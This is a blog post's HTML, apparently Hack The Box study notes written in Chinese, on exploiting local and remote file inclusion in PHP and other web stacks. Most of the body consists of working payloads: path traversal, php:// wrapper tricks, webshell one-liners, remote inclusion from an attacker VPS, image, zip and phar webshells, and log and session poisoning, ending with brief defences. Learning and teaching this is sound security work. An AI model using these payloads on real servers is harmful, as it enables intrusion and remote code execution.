@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="FILE INCLUSIONLFI PHP  include(), include_once(), require(), require_once(), file_get_contents()   NodeJS  readFile(), write(), render()   Java  include, import &lt;c:import url&#x3D; &quot;&lt;%&#x3D; request.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB渗透学习-FILEINCLUSION">
+<meta property="og:url" content="http://example.com/2024/09/16/HTB-19-FILEINCLUSION/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="FILE INCLUSIONLFI PHP  include(), include_once(), require(), require_once(), file_get_contents()   NodeJS  readFile(), write(), render()   Java  include, import &lt;c:import url&#x3D; &quot;&lt;%&#x3D; request.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-15T16:16:33.000Z">
+<meta property="article:modified_time" content="2025-02-26T15:59:03.841Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="渗透测试学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB渗透学习-FILEINCLUSION</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/09/18/%E9%85%B7%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/08/18/HTB-2-NMAP/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&text=HTB渗透学习-FILEINCLUSION"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&is_video=false&description=HTB渗透学习-FILEINCLUSION"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB渗透学习-FILEINCLUSION&body=Check out this article: http://example.com/2024/09/16/HTB-19-FILEINCLUSION/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&name=HTB渗透学习-FILEINCLUSION&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&t=HTB渗透学习-FILEINCLUSION"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FILE-INCLUSION"><span class="toc-number">1.</span> <span class="toc-text">FILE INCLUSION</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI"><span class="toc-number">1.1.</span> <span class="toc-text">LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-Traversal"><span class="toc-number">1.1.1.</span> <span class="toc-text">Path Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Filter"><span class="toc-number">1.1.2.</span> <span class="toc-text">PHP Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper"><span class="toc-number">1.1.3.</span> <span class="toc-text">PHP Wrapper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RFI"><span class="toc-number">1.2.</span> <span class="toc-text">RFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-RFI-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.</span> <span class="toc-text">LFI-RFI 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%951-%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">1.3.1.</span> <span class="toc-text">法1 制作图片马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952-%E5%88%B6%E4%BD%9Czip%E9%A9%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">法2 制作zip马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%953-%E5%88%A9%E7%94%A8Phar-wrapper"><span class="toc-number">1.3.3.</span> <span class="toc-text">法3 利用Phar wrapper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">日志注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Session%E6%8A%95%E6%AF%92"><span class="toc-number">1.4.1.</span> <span class="toc-text">PHP Session投毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Log%E6%8A%95%E6%AF%92"><span class="toc-number">1.4.2.</span> <span class="toc-text">Server Log投毒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BLFI"><span class="toc-number">1.5.</span> <span class="toc-text">自动化检测LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1LFI"><span class="toc-number">1.6.</span> <span class="toc-text">防御LFI</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB渗透学习-FILEINCLUSION
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-15T16:16:33.000Z" class="dt-published" itemprop="datePublished">2024-09-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" rel="tag">渗透测试学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="FILE-INCLUSION"><a href="#FILE-INCLUSION" class="headerlink" title="FILE INCLUSION"></a>FILE INCLUSION</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><ul>
+<li><p>PHP</p>
+<ul>
+<li>include(), include_once(), require(), require_once(), file_get_contents()</li>
+</ul>
+</li>
+<li><p>NodeJS</p>
+<ul>
+<li>readFile(), write(), render()</li>
+</ul>
+</li>
+<li><p>Java</p>
+<ul>
+<li>include, import</li>
+<li><code>&lt;c:import url= &quot;&lt;%= request.getParameter(&#39;language&#39;) %&gt;&quot;/&gt;</code></li>
+</ul>
+</li>
+<li><p>.NET</p>
+<ul>
+<li>Response.WriteFile(), @Html.Partial(), Response.WriteFile(), include</li>
+</ul>
+</li>
+</ul>
+<h3 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title="Path Traversal"></a>Path Traversal</h3><ul>
+<li><p>可以尝试..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
+</li>
+<li><p>也可以直接&#x2F;etc&#x2F;passwd</p>
+</li>
+<li><p>基础绕过</p>
+<ul>
+<li><p>文件名前缀，如<code>include(&quot;lang_&quot; . $_GET[&#39;language&#39;]);</code></p>
+<ul>
+<li>可尝试&#x2F;lang_&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd（如果路径存在）</li>
+</ul>
+</li>
+<li><p>文件扩展名后缀，如<code>include($_GET[&#39;language&#39;] . &quot;.php&quot;);</code></p>
+<ul>
+<li>路径截断（PHP5.4之前）：non_existing_directory&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;.&#x2F;.&#x2F;.&#x2F;.[.&#x2F; REPEATED ~2048 times]</li>
+<li>空字节注入（PHP5.5之前）：&#x2F;etc&#x2F;passwd%00</li>
+</ul>
+</li>
+<li><p>基础替换，如<code>$language = str_replace(&#39;../&#39;, &#39;&#39;, $_GET[&#39;language&#39;]);</code></p>
+<ul>
+<li>双写绕过即可….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;etc&#x2F;passwd</li>
+</ul>
+</li>
+<li><p>编码，如URL编码</p>
+<ul>
+<li>将payload编码即可</li>
+</ul>
+</li>
+<li><p>路径限制，如<code>if(preg_match(&#39;/^\.\/languages\/.+$/&#39;, $_GET[&#39;language&#39;])) &#123;include($_GET[&#39;language&#39;]);&#125; </code></p>
+<ul>
+<li>Fuzz路径</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="PHP-Filter"><a href="#PHP-Filter" class="headerlink" title="PHP Filter"></a>PHP Filter</h3><ul>
+<li><p>php:&#x2F;&#x2F;filter&#x2F;</p>
+<ul>
+<li>尝试base64通过LFI读源码 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config</li>
+</ul>
+</li>
+<li><p>FUZZ php文件</p>
+<ul>
+<li>可以用FFUF <code>ffuf -w directory-list-2.3-small.txt:FUZZ -u http://94.237.59.199:36413/FUZZ.php</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="PHP-Wrapper"><a href="#PHP-Wrapper" class="headerlink" title="PHP Wrapper"></a>PHP Wrapper</h3><ul>
+<li><p>PHP Wrapper 是一个设计模式或编程工具，用于封装 PHP 函数或库，以提供额外的功能或简化其使用。它的作用是通过对现有代码进行封装，为开发者提供更简洁、更易用的接口，同时可能添加一些扩展功能，如日志记录、错误处理、输入输出转换等。</p>
+</li>
+<li><p>Data wrapper：最简单的Wrapper，需要设置里的allow_url_include开启才能利用。</p>
+<ul>
+<li>如果有LFI漏洞并能读取PHP配置文件，就可以查看是否可以利用Wrapper。</li>
+<li>PHP配置文件一般在<code>/etc/php/&lt;Version&gt;/apache2/php.ini</code></li>
+<li>如，用LFI读取Apache2的PHP7.4配置文件 <code>curl &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</code></li>
+<li>然后进行读取<code>echo &#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39; | base64 -d | grep allow_url_include</code></li>
+<li>最后进行RCE<code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; | base64</code></li>
+<li><code>curl -s &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#39; | grep uid</code></li>
+</ul>
+</li>
+<li><p>Input wrapper：也需要allow_url_include开启。使用POST方法。</p>
+<ul>
+<li><code>curl -s -X POST --data &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot; | grep uid</code></li>
+</ul>
+</li>
+<li><p>Expect wrapper：一个外部wrapper，需要被手动安装在后台服务器上。可以通过查看配置文件是否包含<code>expect</code>，即<code>extension=expect</code>来看是否可以利用。</p>
+<ul>
+<li>直接通过LFI来RCE：<code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h2><ul>
+<li><p>PHP</p>
+<ul>
+<li>include()&#x2F;include_once(), file_get_contents()</li>
+</ul>
+</li>
+<li><p>Java</p>
+<ul>
+<li>import</li>
+</ul>
+</li>
+<li><p>.NET</p>
+<ul>
+<li>@Html.RemotePartial(), include</li>
+</ul>
+</li>
+<li><p>在PHP中，RFI要求allow_url_include是打开状态，最简单的测试方法就是在参数里加一个远程地址进去</p>
+<ul>
+<li>VPS上开个HTTP服务，托管一个webshell，包含时就<a href="http://vpsip:port/webshell.php">http://vpsip:port/webshell.php</a></li>
+<li>当HTTP被WAF了，可以VPS上开个FTP服务。<ul>
+<li>PHP默认是尝试匿名Auth的，</li>
+<li>所以可以VPS上<code>sudo python -m pyftpdlib -p 21</code></li>
+<li>然后包含<code>ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id</code></li>
+<li>如果FTP不能匿名Auth就包含时显式加用户名和密码<code>ftp://user:pass@localhost/shell.php&amp;cmd=id</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>SMB</p>
+<ul>
+<li>如果系统是Windows的，可以直接用SMB来包含协议，不需要allow_url_include是打开状态。（该方法最好在同一网络中，SMB访问互联网可能默认是关闭的）</li>
+<li>VPS上使用<code>smbserver.py</code>（默认允许匿名认证）</li>
+<li>包含时直接用SMB访问<code>\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="LFI-RFI-文件上传"><a href="#LFI-RFI-文件上传" class="headerlink" title="LFI-RFI 文件上传"></a>LFI-RFI 文件上传</h2><h3 id="法1-制作图片马"><a href="#法1-制作图片马" class="headerlink" title="法1 制作图片马"></a>法1 制作图片马</h3><ul>
+<li>大致过程：通过上传来上传马，然后获取马的路径，最后用LFI访问上传的马<ul>
+<li><p>制作GIF马</p>
+<ul>
+<li><code>echo &#39;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.gif</code></li>
+</ul>
+</li>
+<li><p>如果不知道上传点，可FUZZ出上传路径，进而得到上传文件路径。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="法2-制作zip马"><a href="#法2-制作zip马" class="headerlink" title="法2 制作zip马"></a>法2 制作zip马</h3><ul>
+<li>大致原理：使用zip wrapper执行php代码<ul>
+<li>制作zip马<code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></li>
+<li>此时，shell.jpg仍然会被一些上传方式识别为zip文件（content-type）</li>
+<li>使用<code>zip://</code>的wrapper访问这个zip文件<ul>
+<li><code>zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code></li>
+<li>访问shell.jpg这个zip文件中的shell.php（shell.jpg#shell.php）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="法3-利用Phar-wrapper"><a href="#法3-利用Phar-wrapper" class="headerlink" title="法3 利用Phar wrapper"></a>法3 利用Phar wrapper</h3><ul>
+<li>大致过程：使用phar:&#x2F;&#x2F; wrapper<br>首先，写一个可被编译为phar文件，生成一个shell.txt文件的shell.php：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;shell.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;shell.txt&#x27;</span>, <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+之后，编译为phar文件，并且重命名为shell.jpg<br><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code><br>最后上传后使用phar wrapper执行<br><code>phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></li>
+</ul>
+<h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><h3 id="PHP-Session投毒"><a href="#PHP-Session投毒" class="headerlink" title="PHP Session投毒"></a>PHP Session投毒</h3><ul>
+<li>Linux下：&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;</li>
+<li>Windows下：C:\Windows\Temp<br>Session的开头为<code>sess_</code>，可以f12查看自己的session，文件就是<code>sess_&lt;client_session&gt;</code></li>
+</ul>
+<p>可以通过修改Session值（如修改为<code>%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code>，即<code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code>）再多传一个get cmd参数就行了</p>
+<p>注：这样的投毒一般只能完成一次指令，想要运行其它指令需要再次投毒。可以通过反向shell、写webshell等方式实现持久化。</p>
+<h3 id="Server-Log投毒"><a href="#Server-Log投毒" class="headerlink" title="Server Log投毒"></a>Server Log投毒</h3><ul>
+<li><p>Apache和Nginx都有log文件，如access.log、error.log等。</p>
+<ul>
+<li>Nginx的log可以被低权限用户读（如www-data）</li>
+<li>Apache的log如果没有配置错误的话，只能被权限用户读（root&#x2F;adm组）</li>
+</ul>
+</li>
+<li><p>Apache的log默认路径</p>
+<ul>
+<li>Linux &#x2F;var&#x2F;log&#x2F;apache2&#x2F;</li>
+<li>Windows  C:\xampp\apache\logs\</li>
+</ul>
+</li>
+<li><p>Nginx的log默认路径</p>
+<ul>
+<li>Linux &#x2F;var&#x2F;log&#x2F;nginx&#x2F;</li>
+<li>Windows C:\nginx\log\</li>
+</ul>
+</li>
+<li><p>可以用<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">Seclists的LFI FUZZ</a>来fuzz路径</p>
+</li>
+<li><p>以access.log为例，access.log为Nginx和Apache都有的log文件，其中含有请求时间、IP 地址、请求的 URL、响应状态码、浏览器用户代理等内容（可能文件会非常大）</p>
+<ul>
+<li>首先确定LFI能访问到该log。</li>
+<li>如果能访问到，可以通过修改包头的字段（如使用BurpSuite修改包头的UA为一句话木马）将恶意内容添加到该log。<ul>
+<li>也可以直接curl：<code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -A &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</code></li>
+</ul>
+</li>
+<li>使用LFI访问被投毒的log实现RCE。</li>
+</ul>
+</li>
+</ul>
+<h2 id="自动化检测LFI"><a href="#自动化检测LFI" class="headerlink" title="自动化检测LFI"></a>自动化检测LFI</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/DragonJAR/Security-Wordlist%E4%B8%AD%E5%AD%98%E5%9C%A8LFI%E5%AD%97%E5%85%B8">https://github.com/DragonJAR/Security-Wordlist中存在LFI字典</a></p>
+</li>
+<li><p>使用ffuf测试web应用程序存在的参数</p>
+<ul>
+<li><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#39; -fs 2287</code></li>
+</ul>
+</li>
+<li><p>使用ffuf测试某参数是否存在LFI</p>
+<ul>
+<li><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287</code></li>
+</ul>
+</li>
+<li><p>Fuzz系统文件</p>
+<ul>
+<li><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287</code></li>
+</ul>
+</li>
+<li><p>服务器配置和log文件</p>
+<ul>
+<li><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="防御LFI"><a href="#防御LFI" class="headerlink" title="防御LFI"></a>防御LFI</h2><ul>
+<li>使用PHP函数：<code>basename()</code></li>
+<li>在php.ini中将<code>allow_url_include</code>关闭</li>
+<li>在php.ini中设置<code>open_basedir</code></li>
+<li>在php.ini中设置<code>disable_functions</code>，将<code>system()</code>函数禁用</li>
+<li>使用WAF</li>
+</ul>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FILE-INCLUSION"><span class="toc-number">1.</span> <span class="toc-text">FILE INCLUSION</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI"><span class="toc-number">1.1.</span> <span class="toc-text">LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-Traversal"><span class="toc-number">1.1.1.</span> <span class="toc-text">Path Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Filter"><span class="toc-number">1.1.2.</span> <span class="toc-text">PHP Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper"><span class="toc-number">1.1.3.</span> <span class="toc-text">PHP Wrapper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RFI"><span class="toc-number">1.2.</span> <span class="toc-text">RFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-RFI-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.</span> <span class="toc-text">LFI-RFI 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%951-%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">1.3.1.</span> <span class="toc-text">法1 制作图片马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952-%E5%88%B6%E4%BD%9Czip%E9%A9%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">法2 制作zip马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%953-%E5%88%A9%E7%94%A8Phar-wrapper"><span class="toc-number">1.3.3.</span> <span class="toc-text">法3 利用Phar wrapper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">日志注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Session%E6%8A%95%E6%AF%92"><span class="toc-number">1.4.1.</span> <span class="toc-text">PHP Session投毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Log%E6%8A%95%E6%AF%92"><span class="toc-number">1.4.2.</span> <span class="toc-text">Server Log投毒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BLFI"><span class="toc-number">1.5.</span> <span class="toc-text">自动化检测LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1LFI"><span class="toc-number">1.6.</span> <span class="toc-text">防御LFI</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&text=HTB渗透学习-FILEINCLUSION"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/16/HTB-19-FILEINCLUSION/&title=HTB渗透学习-FILEINCLUSION"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
